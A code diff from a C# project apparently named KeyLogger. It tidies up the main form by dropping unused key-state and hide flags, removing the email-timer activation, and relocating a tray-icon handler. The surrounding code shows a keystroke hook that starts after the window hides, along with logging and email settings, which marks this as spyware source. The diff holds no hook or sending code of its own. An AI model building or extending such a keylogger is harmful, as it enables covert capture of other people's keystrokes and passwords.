@@ -16,14 +16,8 @@ namespace KeyLogger
         private bool _allowtoTik;
         private UserActivityHook _hooker;
 
-        private bool _isAltDown;
-        private bool _isControlDown;
-        private bool _isFsDown;
-        private bool _isHide;
-        private bool _isShiftDown;
         private int _tik;
         private Params _emailparams;
-        private bool _isEmailerOn;
         private bool _isLoggerOn;
 
         private TextLogger _logger;
@@ -39,8 +33,7 @@ namespace KeyLogger
             if (!_hooker.IsActive)
             {
                 _hooker.Start();
-                if (_isEmailerOn)
-                    timer_emailer.Enabled = true;
+
                 if (_isLoggerOn)
                     timer_logsaver.Enabled = true;
             }
@@ -142,7 +135,6 @@ namespace KeyLogger
         {
             Hide();
             _hooker.Start();
-            _isHide = true;
         }
 
         private void BtnExitClick(object sender, EventArgs e)
@@ -199,7 +191,6 @@ namespace KeyLogger
         {
             Hide();
             _hooker.Start();
-            _isHide = true;
         }
 
         private void MnuItemExitClick(object sender, EventArgs e)
@@ -221,10 +212,13 @@ namespace KeyLogger
             }
         }
 
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            this.Show();
+            this.WindowState = FormWindowState.Normal;
+        }
 
         //End Menu Events
-
-
 
         #region Nested type: Params
 
@@ -240,10 +234,6 @@ namespace KeyLogger
 
         #endregion
 
-        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
-        {
-            this.Show();
-            this.WindowState = FormWindowState.Normal;
-        }
+
     }
 }
